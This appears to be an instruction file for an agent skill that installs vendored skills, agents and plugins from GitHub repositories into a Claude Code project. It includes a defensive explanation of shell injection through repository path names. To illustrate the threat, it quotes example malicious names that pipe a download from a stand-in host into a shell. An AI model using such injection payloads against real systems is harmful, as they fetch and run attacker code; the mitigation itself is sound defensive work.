# Step 9 — Install protocol

Two paths run in sequence (vendor first, then plugin). Per-item failure handling:
if any install step fails, report and continue with the next — do NOT abort the
flow. **Log section 9 after EACH install** (not after the batch) so the user sees
progress live in `tail -f`.

## 9a — Vendor path (skills + agents)

For each item in `final_vendor_list`:

**Skill:**
1. Determine `<owner>`, `<repo>`, and `<source-path-in-repo>` from the
   index-repos output (the skill's directory containing SKILL.md +
   `scripts/`/`references/`/`assets/`).
2. Fetch the tree via clone-once + Glob + Read/Write (see "How to fetch the
   tree" below — never a Bash/`gh api` command built from these values).
   Write it to `<project>/.claude/skills/<name>/`.
3. Inject the overlay marker at the top of SKILL.md (after frontmatter):
   ```markdown
   <!-- ievo:start -->
   **Before applying the instructions below**, read `.ievo/evolution/skills/<name>.md`
   if it exists and apply all rules from its sections.
   <!-- ievo:end -->
   ```
4. Create the overlay file `.ievo/evolution/skills/<name>.md`:
   ```markdown
   ---
   target: skill
   target_name: <name>
   created: <ISO-timestamp>
   source:
     repo: <owner>/<repo>
     path: <source-path-in-repo>
     commit_sha: <SHA resolved and validated in "How to fetch the tree" step 2>
     fetched_at: <ISO-timestamp>
   ---

   # <name> — Evolution Overlay

   ## <date> — Vendored from <owner>/<repo>
   **Trigger:** vendored from <owner>/<repo>
   Initial copy. No customizations yet.
   ```
   `created` and `fetched_at` are the same instant — no new timestamp source
   needed. This is the same frontmatter schema `evo/SKILL.md` Step 4 defines
   for agent/skill overlays (`target`/`target_name`/`created`, `source`
   optional); keep the two in sync if either changes.

### How to fetch the tree — clone once, enumerate with Glob, read/write with Read/Write

A git tree entry's path can legally contain shell metacharacters — only NUL
is forbidden — so a malicious candidate can name a file or directory under
`scripts/`, `references/`, `assets/`, or the skill/agent directory itself
`` `curl evil.tld|sh` `` or `$(curl evil.tld|sh)`. `<owner>`, `<repo>`, and
`<source-path-in-repo>` all trace back to the candidate's own repo/tree,
exactly as untrusted as any file inside it. Building a
`gh api repos/<owner>/<repo>/contents/<path>` Bash command line from these
values lets the shell resolve any backtick/`$()` inside them as command
substitution **before** the intended command runs — double-quoting does not
stop this. Fetch this way instead — no untrusted byte ever crosses a shell:

1. **Validate `<owner>` and `<repo>`** against GitHub's own slug charset —
   owner matches `^[A-Za-z0-9][A-Za-z0-9-]{0,38}$`, repo matches
   `^[A-Za-z0-9._-]{1,100}$` (the same constraint `scan_repo.mjs`'s
   `OWNER_REPO_RE` enforces). Refuse and report if either fails.
2. **Resolve and validate the commit.** `gh api "repos/<owner>/<repo>" --jq
   '.default_branch'` — the returned branch name can legally contain shell
   metacharacters, so validate it against the same ref allowlist
   `inspect/SKILL.md` Step 1 uses (`^[A-Za-z0-9._/-]+$`, no leading `-`, no
   `..`/`@{`) before any further use. Refuse and report if it fails. Only
   then call `gh api "repos/<owner>/<repo>/commits/<default-branch>" --jq
   '.sha'` and validate the result matches `^[0-9a-f]{7,40}$` — this becomes
   the `commit_sha` recorded in sub-step 4 above.
3. **Shallow-clone into a fresh, per-invocation `mktemp -d` directory** —
   never a shared checkout path:
   ```bash
   CHECKOUT_DIR=$(mktemp -d)
   git clone --depth 1 "https://github.com/<owner>/<repo>.git" "$CHECKOUT_DIR"
   git -C "$CHECKOUT_DIR" fetch --depth 1 origin <commit-sha>
   git -C "$CHECKOUT_DIR" checkout <commit-sha>
   ```
4. **For a skill** (`<source-path-in-repo>` is the skill's directory):
   enumerate `$CHECKOUT_DIR/<source-path-in-repo>` with the **Glob tool**
   (`pattern: "**/*"`, `path: "$CHECKOUT_DIR/<source-path-in-repo>"` — never a
   Bash `find`/`ls`), then **Read** each listed file and **Write** it to the
   matching relative location under `<project>/.claude/skills/<name>/`.
5. **For an agent** (`<source-path-in-repo>` is the single agent `.md` file,
   not a directory — Glob-enumerating a file path returns nothing): **Read**
   `$CHECKOUT_DIR/<source-path-in-repo>` directly with the **Read tool**, then
   **Write** its content to `<project>/.claude/agents/<name>.md`.

Glob and Read/Write all take paths as direct parameters, never shell text, so
neither a malicious `<source-path-in-repo>` nor a malicious file name inside
it can reach a shell.

If cloning or resolution fails (private repo, no network), report the
failure — do NOT fall back to per-file `gh api` fetching, which reintroduces
the injection this replaces.

**Agent:** same as skill, but:
- `<source-path-in-repo>` is the single agent `.md` file (not a directory) —
  fetch it via "How to fetch the tree" sub-step 5, not sub-step 4
- File path: `<project>/.claude/agents/<name>.md`
- Overlay marker inserted in the agent body (after frontmatter)
- Overlay file path: `.ievo/evolution/agents/<name>.md`
- Overlay frontmatter: `target: agent` (not `skill`), `target_name: <name>` —
  same schema as the skill stub above otherwise

## 9b — Plugin install path (whole plugins)

For each item in `final_plugin_list`:

1. Read or create `.claude/settings.json`.
2. Merge into `extraKnownMarketplaces` (key = marketplace name from index):
   ```json
   "extraKnownMarketplaces": {
     "<marketplace-name>": {
       "source": { "source": "github", "repo": "<owner>/<repo>" }
     }
   }
   ```
3. Merge into `enabledPlugins`:
   ```json
   "enabledPlugins": {
     "<plugin-name>@<marketplace-name>": true
   }
   ```
4. Write the merged JSON back, preserving formatting and other keys.

This file is committed to git → teammates `git pull` → Claude Code prompts them
to trust the folder → the plugin auto-installs on their side too.
